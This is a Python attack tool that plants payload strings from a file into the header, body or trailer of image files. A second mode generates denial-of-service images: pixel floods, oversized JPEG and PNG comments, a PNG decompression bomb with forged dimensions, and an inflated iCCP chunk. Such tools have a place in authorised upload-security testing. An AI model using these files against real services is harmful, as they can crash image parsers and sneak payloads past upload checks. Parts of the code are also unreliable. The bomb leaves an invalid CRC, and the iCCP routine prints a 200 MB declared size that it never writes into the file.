#!/usr/bin/env python3
import argparse
import os
import shutil
import concurrent.futures
from PIL import Image, PngImagePlugin, UnidentifiedImageError
import io
import struct
import time
import traceback
from tqdm import tqdm
import math
import sys

# --- Constants ---
SUPPORTED_IMAGE_EXTENSIONS = {'.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff'}
DEFAULT_OUTPUT_DIR = 'loaded'
MUTATIONS_PER_PAYLOAD = 3 # header, body, trailer
DEFAULT_WORKERS = 4 # Fallback if CPU count cannot be determined

# --- Error Handling ---
class ImageProcessingError(Exception):
    """Custom exception for image processing errors."""
    pass

# --- Injection Functions ---

def inject_payload(image_path, payload, output_path, injection_type):
    """Injects payload into an image based on the specified type."""
    try:
        with open(image_path, 'rb') as f:
            image_data = f.read()

        payload_bytes = payload.encode('utf-8', errors='ignore') # Ensure payload is bytes
        ext = os.path.splitext(image_path)[1].lower()

        if injection_type == 'header':
            if ext == '.png':
                # PNG: After signature
                insertion_point = 8
                if len(image_data) < insertion_point:
                     raise ImageProcessingError(f"PNG file too short for header injection: {image_path}")
                new_data = image_data[:insertion_point] + payload_bytes + image_data[insertion_point:]
            elif ext in ('.jpg', '.jpeg'):
                # JPG: After SOI marker
                insertion_point = 2
                if len(image_data) < insertion_point:
                     raise ImageProcessingError(f"JPG file too short for header injection: {image_path}")
                new_data = image_data[:insertion_point] + payload_bytes + image_data[insertion_point:]
            elif ext == '.gif':
                # GIF: After header
                insertion_point = 6 # or 13 if including Logical Screen Descriptor
                if len(image_data) < insertion_point:
                     raise ImageProcessingError(f"GIF file too short for header injection: {image_path}")
                new_data = image_data[:insertion_point] + payload_bytes + image_data[insertion_point:]
            else:
                # Generic fallback: prepend
                new_data = payload_bytes + image_data

        elif injection_type == 'body':
            mid_point = len(image_data) // 2
            insertion_point = mid_point

            if ext == '.png':
                # Try to insert before the first IDAT chunk
                try:
                    # Find first IDAT chunk header (length + 'IDAT')
                    idat_search_start = 8 # After PNG signature
                    idat_pos = image_data.find(b'IDAT', idat_search_start)
                    if idat_pos > idat_search_start:
                        # The insertion point is before the length field of the IDAT chunk
                        insertion_point = idat_pos - 4
                    else:
                         # Fallback if IDAT not found where expected
                         insertion_point = mid_point
                except Exception:
                     insertion_point = mid_point # Fallback on any error
            elif ext in ('.jpg', '.jpeg'):
                 # Try to insert after a common marker near the middle (e.g., SOS 0xFFDA, or APPn 0xFFE*)
                 # This is heuristic and might corrupt some JPEGs
                 try:
                     # Look for Start Of Scan marker near the middle as a reasonable guess
                     sos_marker = b'\xFF\xDA'
                     marker_pos = image_data.find(sos_marker, max(0, mid_point - 2000), mid_point + 2000)
                     if marker_pos != -1:
                         # Find the end of the SOS segment (skip length field)
                         # segment_len = struct.unpack('>H', image_data[marker_pos+2:marker_pos+4])[0]
                         # insertion_point = marker_pos + 2 + segment_len # Insert after SOS segment - risky!
                         insertion_point = marker_pos + 2 # Safer: Insert right after marker ID
                     else:
                         # Fallback: Look for any FF marker near the middle
                         marker_pos = image_data.find(b'\xFF', max(0, mid_point - 1000), mid_point + 1000)
                         insertion_point = marker_pos + 2 if marker_pos > 0 else mid_point
                 except Exception:
                     insertion_point = mid_point # Fallback on any error
            # else: GIF, BMP, TIFF body injection is less defined, stick to midpoint

            # Ensure insertion point is valid
            insertion_point = max(0, min(insertion_point, len(image_data)))
            new_data = image_data[:insertion_point] + payload_bytes + image_data[insertion_point:]

        elif injection_type == 'trailer':
            # Append to the end
            new_data = image_data + payload_bytes
        else:
            raise ValueError(f"Unknown injection type: {injection_type}")

        # Write the modified data
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, 'wb') as f:
            f.write(new_data)

    except FileNotFoundError:
        raise ImageProcessingError(f"Input image not found: {image_path}")
    except IOError as e:
        raise ImageProcessingError(f"I/O error processing {image_path}: {e}")
    except Exception as e:
        # Catch any other unexpected errors during processing
        raise ImageProcessingError(f"Unexpected error injecting {injection_type} for {os.path.basename(image_path)}: {e}\n{traceback.format_exc()}")


# --- DoS Image Creation Functions ---
# (Added basic error handling and slightly more conservative sizes)

def create_pixel_flood_image(output_path):
    """Creates a large dimension, simple image (potential DoS)."""
    dims = [(10000, 10000), (5000, 5000), (2000, 2000)] # Try decreasing sizes
    for width, height in dims:
        try:
            print(f"Attempting pixel flood with dimensions: {width}x{height}")
            img = Image.new('RGB', (width, height), color='white')
            img.save(output_path)
            print(f"Successfully created pixel flood image: {output_path}")
            return True
        except (MemoryError, ValueError, IOError) as e:
            print(f"Warning: Failed creating pixel flood ({width}x{height}): {e}")
        except Exception as e:
            print(f"Warning: Unexpected error creating pixel flood ({width}x{height}): {e}")
            traceback.print_exc(file=sys.stderr) # Print detailed traceback for unexpected errors
    print(f"Error: Could not create pixel flood image after multiple attempts: {output_path}")
    return False


def create_long_body_image(output_path):
    """Creates an image with large metadata/comment sections (potential DoS)."""
    try:
        img = Image.new('RGB', (100, 100), color='white')
        ext = os.path.splitext(output_path)[1].lower()

        if ext == '.png':
            meta = PngImagePlugin.PngInfo()
            comment_size = 100 * 1024 # 100 KB total comment data
            num_comments = 100
            comment_len = comment_size // num_comments
            print(f"Creating PNG with {num_comments} comments, total size ~{comment_size/1024:.1f} KB")
            for i in range(num_comments):
                 # Use bytes for potentially large comments if needed, though Pillow handles strings
                 meta.add_text(f"Comment{i}", "A" * comment_len, zip=False) # zip=False might help avoid compression issues
            img.save(output_path, pnginfo=meta)

        elif ext in ('.jpg', '.jpeg'):
            buffer = io.BytesIO()
            img.save(buffer, format="JPEG", quality=95) # Use standard JPEG saving
            img_data = buffer.getvalue()

            # Insert a large COM (Comment) marker segment
            # JPEG COM marker: FF FE, followed by 2-byte length (including length field itself)
            com_marker = b'\xFF\xFE'
            comment_payload = b'A' * (65533 - 2) # Max length for a segment payload (65535 - 2 bytes for length)
            comment_len_bytes = struct.pack('>H', len(comment_payload) + 2)

            # Find a suitable insertion point (e.g., after SOI)
            insertion_point = 2 # After SOI (FF D8)
            if len(img_data) < insertion_point:
                 raise ImageProcessingError("JPEG data too short to insert comment.")

            print(f"Creating JPEG with large COM segment (~{len(comment_payload)/1024:.1f} KB)")
            new_data = img_data[:insertion_point] + com_marker + comment_len_bytes + comment_payload + img_data[insertion_point:]

            with open(output_path, 'wb') as f:
                f.write(new_data)
        else:
            print(f"Warning: Long body creation not specifically implemented for {ext}, saving standard image.")
            img.save(output_path) # Save a standard image for other types

        print(f"Successfully created long body image: {output_path}")
        return True

    except (MemoryError, ValueError, IOError) as e:
        print(f"Error creating long body image: {e}")
    except Exception as e:
        print(f"Unexpected error creating long body image: {e}")
        traceback.print_exc(file=sys.stderr)
    return False


def create_decompression_bomb(output_path):
    """Creates a small PNG file that claims large dimensions (decompression bomb)."""
    # Based on common zip/deflate bomb principles adapted for PNG IHDR
    # Creates a 1x1 pixel image but declares massive dimensions in IHDR
    try:
        width, height = 1, 1 # Actual pixels
        img = Image.new('RGB', (width, height), color='white')

        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        img_data = buffer.getvalue() # Get a minimal valid PNG structure

        # Find the IHDR chunk (should be right after the 8-byte signature)
        ihdr_start = 8
        if len(img_data) < ihdr_start + 4 + 4 + 13 + 4: # Sig + Len + Type + Data + CRC
            raise ImageProcessingError("Could not find IHDR chunk in base image.")
        if img_data[ihdr_start+4:ihdr_start+8] != b'IHDR':
             raise ImageProcessingError("IHDR chunk not found at expected position.")

        # IHDR data structure: Width (4), Height (4), Bit Depth (1), Color Type (1),
        # Compression (1), Filter (1), Interlace (1)
        new_ihdr_data = bytearray(img_data)

        # Overwrite Width and Height with large values
        declared_width = 30000 # e.g., 30k x 30k
        declared_height = 30000
        print(f"Creating PNG decompression bomb declaring dimensions: {declared_width}x{declared_height}")
        struct.pack_into('>II', new_ihdr_data, ihdr_start + 8, declared_width, declared_height) # Write into offset 8 within chunk data

        # Recalculate CRC for the modified IHDR chunk (Type + Data)
        # For simplicity, we'll skip CRC recalculation here. Many parsers ignore it,
        # but a strict parser would fail. A real bomb might need zlib.crc32.
        # For this example, we assume lenient parsers.

        with open(output_path, 'wb') as f:
            f.write(new_ihdr_data)

        print(f"Successfully created decompression bomb image: {output_path}")
        return True
    except (MemoryError, ValueError, IOError, struct.error) as e:
        print(f"Error creating decompression bomb: {e}")
    except Exception as e:
        print(f"Unexpected error creating decompression bomb: {e}")
        traceback.print_exc(file=sys.stderr)
    return False


def create_color_profile_dos(output_path):
    """Creates a PNG with an overly large iCCP chunk (potential DoS)."""
    try:
        img = Image.new('RGB', (100, 100), color='white')

        buffer = io.BytesIO()
        img.save(buffer, format="PNG")
        img_data = buffer.getvalue()

        # Find a suitable insertion point (e.g., before first IDAT)
        idat_pos = img_data.find(b'IDAT')
        if idat_pos == -1:
            raise ImageProcessingError("Could not find IDAT chunk to insert iCCP before.")
        # Insertion point is before the IDAT chunk's length field
        insertion_point = idat_pos - 4

        # Construct the malicious iCCP chunk
        # iCCP Structure: Profile Name (1-79 bytes, null-terminated), Compression Method (1 byte), Compressed Profile (N bytes)
        profile_name = b'LargeProfile\0'
        compression_method = b'\x00' # 0: Deflate
        # Create a large amount of compressible data (e.g., zeros)
        # We won't actually compress it here, just create a large declared size.
        # Some parsers might try to allocate memory based on declared size *before* decompression.
        declared_profile_size = 200 * 1024 * 1024 # Declare 200 MB profile size! Be cautious.
        actual_data = b'\x78\x9c' # Minimal zlib header (no compression)

        chunk_data = profile_name + compression_method + actual_data
        chunk_len = len(chunk_data)

        # Assemble the chunk: Length (4 bytes), Type (4 bytes, iCCP), Data (N bytes), CRC (4 bytes)
        iccp_chunk_type = b'iCCP'
        # We'll use a placeholder CRC. A strict parser would fail.
        placeholder_crc = struct.pack('>I', 0x12345678)

        print(f"Creating PNG with large iCCP chunk (declared size: {declared_profile_size / (1024*1024):.1f} MB)")
        new_data = (img_data[:insertion_point] +
                    struct.pack('>I', chunk_len) +
                    iccp_chunk_type +
                    chunk_data +
                    placeholder_crc +
                    img_data[insertion_point:]) # Append rest of original image

        with open(output_path, 'wb') as f:
            f.write(new_data)
        print(f"Successfully created color profile DoS image: {output_path}")
        return True
    except (MemoryError, ValueError, IOError, struct.error) as e:
        print(f"Error creating color profile DoS: {e}")
    except Exception as e:
        print(f"Unexpected error creating color profile DoS: {e}")
        traceback.print_exc(file=sys.stderr)
    return False


# --- Processing Logic ---

def process_single_image_payload_task(input_image_path, payload, payload_index, output_dir, verbose_level=0):
    """Processes one payload against one image, creating 3 mutations."""
    results = {'success': 0, 'fail': 0, 'errors': []}
    base_name = os.path.splitext(os.path.basename(input_image_path))[0]
    ext = os.path.splitext(input_image_path)[1].lower() # Keep original extension

    # Ensure output filenames are safe and unique
    safe_base_name = "".join(c if c.isalnum() or c in ('-', '_') else '_' for c in base_name)
    output_name_template = os.path.join(output_dir, f"{safe_base_name}_p{payload_index}_m{{}}{ext}")

    mutations = {
        1: ('header', output_name_template.format(1)),
        2: ('body', output_name_template.format(2)),
        3: ('trailer', output_name_template.format(3)),
    }

    for mutation_num, (inj_type, output_path) in mutations.items():
        try:
            if verbose_level >= 2:
                print(f"  Injecting type '{inj_type}' for payload {payload_index} into {os.path.basename(input_image_path)} -> {os.path.basename(output_path)}")
            inject_payload(input_image_path, payload, output_path, inj_type)
            results['success'] += 1
        except ImageProcessingError as e:
            results['fail'] += 1
            error_msg = f"Failed {inj_type} injection for payload {payload_index} on {os.path.basename(input_image_path)}: {e}"
            results['errors'].append(error_msg)
            if verbose_level >= 1:
                print(f"ERROR: {error_msg}", file=sys.stderr)
        except Exception as e: # Catch unexpected errors
             results['fail'] += 1
             error_msg = f"Unexpected failure during {inj_type} injection for payload {payload_index} on {os.path.basename(input_image_path)}: {e}"
             results['errors'].append(error_msg)
             if verbose_level >= 1:
                 print(f"ERROR: {error_msg}", file=sys.stderr)
                 if verbose_level >= 2:
                      traceback.print_exc(file=sys.stderr)


    return results # Return detailed results

# --- Smart Resource Calculation ---

def get_optimal_workers():
    """Determines a reasonable number of workers based on CPU cores."""
    optimal_workers = DEFAULT_WORKERS # Start with fallback
    try:
        cpu_cores = os.cpu_count()
        if cpu_cores:
            # Use slightly fewer cores than total to leave resources for OS/other tasks,
            # but not less than 1.
            optimal_workers = max(1, cpu_cores - 1)
            print(f"System CPU cores: {cpu_cores}. Using {optimal_workers} worker threads.")
        else:
            print(f"Warning: Could not determine CPU count. Using default {DEFAULT_WORKERS} workers.")
            optimal_workers = DEFAULT_WORKERS
    except NotImplementedError:
        print(f"Warning: os.cpu_count() not implemented. Using default {DEFAULT_WORKERS} workers.")
        optimal_workers = DEFAULT_WORKERS
    except Exception as e:
         print(f"Warning: Error getting CPU count ({e}). Using default {DEFAULT_WORKERS} workers.")
         optimal_workers = DEFAULT_WORKERS

    return optimal_workers

# --- Main Execution ---

def main():
    parser = argparse.ArgumentParser(
        description='Inject payloads into images or create DoS images.\nUses an optimal number of threads based on system cores.',
        formatter_class=argparse.RawTextHelpFormatter # Preserve newline formatting in help
        )
    parser.add_argument(
        '-i', '--input', required=True,
        help='Path to the input image file OR a folder containing image files.'
        )
    parser.add_argument(
        '-p', '--payloads',
        help='Path to the text file containing payloads (one per line).\nRequired unless --dosimage is used.'
        )
    parser.add_argument(
        '--dosimage', action='store_true',
        help='Create various DoS image files instead of injecting payloads.\nIgnores -p argument. Processes the image specified in -i only if needed by a DoS type (otherwise -i is ignored).'
        )
    # REMOVED: -t/--threads argument
    # parser.add_argument(
    #     '-t', '--threads', type=int, default=4,
    #     help='Maximum number of concurrent processing threads (default: 4).\nThe script will attempt to use a smart default based on CPU cores, capped by this value.'
    #     )
    parser.add_argument(
        '-o', '--output', default=DEFAULT_OUTPUT_DIR,
        help=f'Directory to save the output images (default: {DEFAULT_OUTPUT_DIR}).\nWill be created if it doesn\'t exist, and overwritten if it does.'
        )
    parser.add_argument(
        '-v', '--verbose', action='count', default=0,
        help='Increase output verbosity (-v for errors, -vv for detailed processing steps).'
        )

    args = parser.parse_args()

    start_time = time.time()
    output_dir = args.output
    verbose_level = args.verbose

    # --- Prepare Output Directory ---
    try:
        if os.path.exists(output_dir):
            if verbose_level >= 1:
                print(f"Output directory '{output_dir}' already exists. Removing...")
            shutil.rmtree(output_dir)
        os.makedirs(output_dir)
        if verbose_level >= 1:
            print(f"Created output directory: '{output_dir}'")
    except OSError as e:
        print(f"Error: Could not create or clean output directory '{output_dir}': {e}", file=sys.stderr)
        return 1 # Exit with error code

    # --- Mode 1: Create DoS Images ---
    if args.dosimage:
        print("--- Mode: Creating DoS Images ---")
        # Note: -i is currently ignored for most DoS types, but could be used as a base
        # for some future DoS methods if needed.

        dos_tasks = [
            ("Pixel Flood", create_pixel_flood_image, os.path.join(output_dir, "dos_pixel_flood.png")),
            ("Long Body (PNG)", create_long_body_image, os.path.join(output_dir, "dos_long_body.png")),
            ("Long Body (JPG)", create_long_body_image, os.path.join(output_dir, "dos_long_body.jpg")),
            ("Decompression Bomb (PNG)", create_decompression_bomb, os.path.join(output_dir, "dos_decompression.png")),
            ("Color Profile (PNG)", create_color_profile_dos, os.path.join(output_dir, "dos_color_profile.png")),
        ]
        dos_types_total = len(dos_tasks)
        successful_dos = 0
        failed_dos = 0

        print(f"Attempting to create {dos_types_total} types of DoS images...")

        # DoS images are created sequentially as they can be resource-intensive
        # and less likely to benefit from simple threading.
        with tqdm(total=dos_types_total, desc="Creating DoS images", unit="image", disable=verbose_level >= 2) as pbar:
            for name, func, path in dos_tasks:
                pbar.set_postfix_str(f"Creating {name}", refresh=True)
                if verbose_level >= 1:
                    print(f"\nCreating {name} -> {path}")
                success = func(path)
                if success:
                    successful_dos += 1
                else:
                    failed_dos += 1
                pbar.update(1)

        total_time = time.time() - start_time
        print("\n" + "="*60)
        print("DoS Image Creation Summary:")
        print("-"*60)
        print(f"Total DoS image types attempted : {dos_types_total}")
        print(f"Successful DoS images created   : {successful_dos}")
        print(f"Failed DoS images               : {failed_dos}")
        print(f"Total processing time           : {total_time:.2f} seconds")
        print("="*60)
        if successful_dos > 0:
            print(f"DoS images created in '{output_dir}' directory.")
        else:
            print("No DoS images were successfully created.")
        return 0 if failed_dos == 0 else 1

    # --- Mode 2: Inject Payloads ---
    else:
        print("--- Mode: Injecting Payloads ---")
        # --- Validate Payloads File ---
        if not args.payloads:
            parser.error("Payload file (-p, --payloads) is required when not using --dosimage")
        if not os.path.isfile(args.payloads):
            print(f"Error: Payload file not found: {args.payloads}", file=sys.stderr)
            return 1

        try:
            with open(args.payloads, 'r', encoding='utf-8', errors='ignore') as f:
                payloads = [line.strip() for line in f if line.strip()]
            if not payloads:
                print(f"Error: No payloads found in '{args.payloads}'.", file=sys.stderr)
                return 1
            if verbose_level >= 1:
                print(f"Loaded {len(payloads)} payloads from '{args.payloads}'")
        except IOError as e:
             print(f"Error reading payload file '{args.payloads}': {e}", file=sys.stderr)
             return 1

        # --- Find Input Images ---
        input_arg = args.input
        image_paths = []
        if os.path.isfile(input_arg):
            if os.path.splitext(input_arg)[1].lower() in SUPPORTED_IMAGE_EXTENSIONS:
                image_paths.append(input_arg)
                if verbose_level >= 1:
                    print(f"Processing single input image: {input_arg}")
            else:
                print(f"Error: Input file '{input_arg}' is not a supported image type ({', '.join(SUPPORTED_IMAGE_EXTENSIONS)}).", file=sys.stderr)
                return 1
        elif os.path.isdir(input_arg):
            if verbose_level >= 1:
                print(f"Scanning input folder for images: {input_arg}")
            found_count = 0
            for filename in os.listdir(input_arg):
                if os.path.splitext(filename)[1].lower() in SUPPORTED_IMAGE_EXTENSIONS:
                    full_path = os.path.join(input_arg, filename)
                    if os.path.isfile(full_path): # Ensure it's actually a file
                        image_paths.append(full_path)
                        found_count += 1
            if not image_paths:
                print(f"Error: No supported image files found in directory: {input_arg}", file=sys.stderr)
                return 1
            if verbose_level >= 1:
                 print(f"Found {len(image_paths)} supported images to process.")
        else:
            print(f"Error: Input path '{input_arg}' is neither a file nor a directory.", file=sys.stderr)
            return 1

        # --- Setup Multiprocessing ---
        num_images = len(image_paths)
        num_payloads = len(payloads)
        total_tasks = num_images * num_payloads # Each task processes one image-payload pair (3 mutations)

        # Get the optimal worker count automatically
        workers = get_optimal_workers() # No longer takes args.threads

        print(f"Preparing to process {num_payloads} payloads against {num_images} image(s).")
        print(f"Total individual injection mutations to perform: {total_tasks * MUTATIONS_PER_PAYLOAD}")

        all_jobs = []
        for img_path in image_paths:
            for i, payload in enumerate(payloads):
                all_jobs.append((img_path, payload, i + 1)) # 1-based index for payload

        total_success_mutations = 0
        total_failed_mutations = 0
        task_errors = []

        # --- Execute Tasks ---
        with tqdm(total=total_tasks, desc="Injecting payloads", unit="task", disable=verbose_level >= 2) as pbar:
            # Use ThreadPoolExecutor as file I/O is often the bottleneck
            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
                # Submit all tasks
                future_to_job = {
                    executor.submit(process_single_image_payload_task, img_path, pload, p_idx, output_dir, verbose_level): (img_path, p_idx)
                    for img_path, pload, p_idx in all_jobs
                }

                # Process results as they complete
                for future in concurrent.futures.as_completed(future_to_job):
                    img_path, p_idx = future_to_job[future]
                    try:
                        result = future.result() # Get result dict from the task function
                        total_success_mutations += result['success']
                        total_failed_mutations += result['fail']
                        if result['errors']:
                             task_errors.extend(result['errors']) # Collect detailed errors
                        if verbose_level >= 2 and result['success'] > 0 :
                             print(f"  Finished payload {p_idx} for {os.path.basename(img_path)} ({result['success']} successful mutations)")

                    except Exception as exc:
                        # This catches errors *getting* the result, less likely if task handles its own errors
                        fail_count = MUTATIONS_PER_PAYLOAD # Assume all mutations failed for this task
                        total_failed_mutations += fail_count
                        error_msg = f"Task failed for image '{os.path.basename(img_path)}', payload {p_idx}: {exc}"
                        task_errors.append(error_msg)
                        if verbose_level >= 1:
                             print(f"\nERROR: {error_msg}", file=sys.stderr)
                             if verbose_level >= 2:
                                 traceback.print_exc(file=sys.stderr)

                    pbar.update(1) # Update progress bar for each completed image-payload task

        # --- Final Summary ---
        total_time = time.time() - start_time
        total_processed_tasks = total_success_mutations + total_failed_mutations
        avg_time_per_task = total_time / total_tasks if total_tasks > 0 else 0
        avg_time_per_mutation = total_time / total_processed_tasks if total_processed_tasks > 0 else 0

        print("\n" + "="*60)
        print("Payload Injection Summary:")
        print("-"*60)
        print(f"Input images processed        : {num_images}")
        print(f"Payloads used                 : {num_payloads}")
        print(f"Total image-payload tasks     : {total_tasks}")
        print(f"Mutations per task            : {MUTATIONS_PER_PAYLOAD}")
        print(f"Expected total mutations      : {total_tasks * MUTATIONS_PER_PAYLOAD}")
        print("-"*60)
        print(f"Successful mutations created  : {total_success_mutations}")
        print(f"Failed mutations              : {total_failed_mutations}")
        print("-"*60)
        print(f"Total processing time         : {total_time:.2f} seconds")
        if total_tasks > 0:
             print(f"Avg time per image-payload task : {avg_time_per_task:.3f} seconds")
        if total_processed_tasks > 0:
             print(f"Avg time per mutation         : {avg_time_per_mutation:.4f} seconds")
        print("="*60)

        if total_failed_mutations > 0 and verbose_level == 0:
            print(f"NOTE: {total_failed_mutations} mutation(s) failed. Run with -v or -vv for detailed errors.")
        elif task_errors and verbose_level > 0:
             print("\n--- Encountered Errors ---")
             # Limit displayed errors if there are too many
             max_errors_to_show = 20
             for i, err in enumerate(task_errors):
                 if i < max_errors_to_show:
                     print(f"- {err}")
                 elif i == max_errors_to_show:
                     print(f"- ... and {len(task_errors) - max_errors_to_show} more errors.")
                     break
             print("------------------------\n")


        if total_success_mutations > 0:
            print(f"Output images saved in '{output_dir}' directory.")
        else:
            print("No images were successfully generated.")

        return 0 if total_failed_mutations == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
